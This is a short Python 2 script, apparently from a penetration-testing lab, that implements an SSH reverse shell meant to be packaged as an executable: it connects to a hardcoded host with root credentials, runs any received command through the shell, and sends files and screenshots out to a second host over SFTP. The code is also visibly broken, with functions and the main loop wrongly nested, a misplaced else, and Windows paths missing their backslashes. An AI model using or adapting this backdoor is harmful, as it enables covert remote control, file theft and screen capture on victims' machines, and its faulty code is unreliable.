## Code Wrup up into EXE

import paramiko
import threading
import subprocess
from PIL import ImageGrab
 
def sftp(local_path,name):
    try:
        transport = paramiko.Transport(('10.0.2.16', 22))
        transport.connect(username = 'root', password = 'toor')
        sftp = paramiko.SFTPClient.from_transport(transport)
        sftp.put(local_path, '/root/Desktop/SFTP-Upload/'+name)
        sftp.close()
        transport.close()
        return '[+] Done'
    except Exception,e:
        return str(e)
 
    def screenshot():
        try:
            im = ImageGrab.grab()
            im.save('C:UsersHussamDesktopscreenshot.png')
        except Exception,e:
            return str(e)
        return sftp('C:UsersHussamDesktopscreenshot.png','screenshot')
 
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect('10.0.2.15', username='root', password='toor')
    chan = client.get_transport().open_session()
    chan.send('Hey i am connected :) ')
    print chan.recv(1024)
 
    while True:
        command = chan.recv(1024)
        if 'grab' in command:
            grab,name,path = command.split('*')
            chan.send( sftp(path,name) )
 
        elif 'getscreen' in command:
            chan.send ( screenshot() )
 
    else:
         try:
            CMD = subprocess.check_output(command, shell=True)
            chan.send(CMD)
         except Exception,e:
            chan.send(str(e))